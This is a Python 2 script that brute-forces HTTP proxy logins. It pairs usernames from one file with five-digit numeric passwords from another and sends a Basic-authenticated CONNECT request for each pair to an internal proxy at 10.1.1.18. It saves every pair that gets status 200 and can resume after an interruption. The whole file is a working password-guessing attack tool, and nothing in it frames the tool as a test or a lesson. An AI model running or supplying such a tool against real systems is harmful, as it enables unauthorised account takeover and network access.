__author__ = 'kapish'
import httplib,base64,socket,time,string,random
start = time.time()         #the variable that holds the starting time
elapsed = 0

with open('Temp/18_usernames.txt', 'r') as usr:
    username = usr.readlines()
username = [x.strip('\n') for x in username]

with open('Temp/5dnum.txt','r') as pwd:
    password = pwd.readlines()
password = [x.strip('\n') for x in password]

host='www.google.com'
port=443
phost='10.1.1.18'
pport=80

while True:
    try:
        with open('Temp/last.txt','r') as lst:
            last = lst.readlines()
        last = [x.strip('\n') for x in last]

        for i in xrange(int(last[0]),len(username)):
            user=username[i]
            flag=0
            for j in xrange(int(last[1]),len(password)):
                passwd=password[j]
                #setup basic authentication
                user_pass=base64.encodestring(user+':'+passwd)
                proxy_authorization='Proxy-authorization: Basic '+user_pass+'\r\n'
                proxy_connect='CONNECT %s:%s HTTP/1.0\r\n'%(host,port)
                user_agent='User-Agent: python\r\n'
                proxy_pieces=proxy_connect+proxy_authorization+user_agent+'\r\n'

                #now connect, very simple recv and error checking
                proxy=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                proxy.connect((phost,pport))
                proxy.sendall(proxy_pieces)
                response=proxy.recv(8192)
                status=response.split()[1]
                if status==str(200):
                    print 'Successful pass=',passwd
                    elapsed = time.time() - start
                    f = open('user_pass.txt', 'a')
                    f.write("%s %s\n" %(user,passwd))
                    print "Time taken = ",elapsed
                    flag=1
                    break
                elif status==str(407):
                    print 'wrong ',passwd
                else:
                    print 'Error status=',str(status)
                f2 = open('Temp/last.txt', 'w')
                f2.write("%s\n%s" %(i,j))
            last[1]="0"
            if flag==0:
                f2 = open('Temp/notfound.txt', 'a')
                f2.write("%s\n" % user)
    except IOError: pass
    time.sleep(10)
